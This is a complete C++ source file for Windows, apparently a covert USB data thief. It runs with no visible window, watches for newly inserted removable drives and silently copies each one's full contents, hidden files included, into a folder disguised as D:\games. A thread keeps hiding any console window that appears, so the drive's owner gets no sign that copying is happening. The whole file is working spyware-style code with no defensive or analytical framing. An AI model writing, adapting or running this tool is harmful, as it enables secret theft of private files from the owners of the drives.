#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
using namespace std;

unsigned char i;
bool flag;
bool finish;
int usbnums;
char src[20] = "X:\\";
char dest[20] = "D:\\games\\files[0]\\";
char usbname[20];
vector<string> usbs;

HANDLE hthread = NULL;
HANDLE hthread2 = NULL;
HANDLE husb = NULL;

DWORD WINAPI copyfile(LPVOID) {
	finish = false;
	char cmd[200];
	sprintf(cmd, "cmd.exe /c xcopy %c: %s /e /y /q /h", i, dest);
	system(cmd);	//cmd命令执行完才返回
	finish = true;
	return 0;
}

DWORD WINAPI hide(LPVOID) {
	while (true)
		ShowWindow(FindWindow("ConsoleWindowClass", NULL), SW_HIDE);
	return 0;
}

bool checkusb() {
	vector<string>::iterator result;
	result = find(usbs.begin(), usbs.end(), usbname);
	if (result == usbs.end())
		return true;
	else
		return false;
}

int main() {
	usbnums = 0;
	while (true) {
		flag = false;
		sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
		while (!flag) {
			UINT DiskType;
			for (i = 'B'; i < 'Z' - 1; i++) {
				src[0] = i;
				DiskType = GetDriveType(src);
				if (DiskType == DRIVE_REMOVABLE) {
					GetVolumeInformation(src, usbname, 20, NULL, NULL, NULL, NULL, NULL);
					if ( checkusb()) {
						hthread = CreateThread(NULL, 0, copyfile, NULL, 0, NULL);
						hthread2 = CreateThread(NULL, 0, hide, NULL, 0, NULL);
						usbs.push_back(usbname);
						flag = true;
						usbnums++;
					} else 
						continue;
				}
			}
			Sleep(5000);
		}
		while (!finish)		//未完成复制要等待
			Sleep(10*1000);
	}
	return 0;
}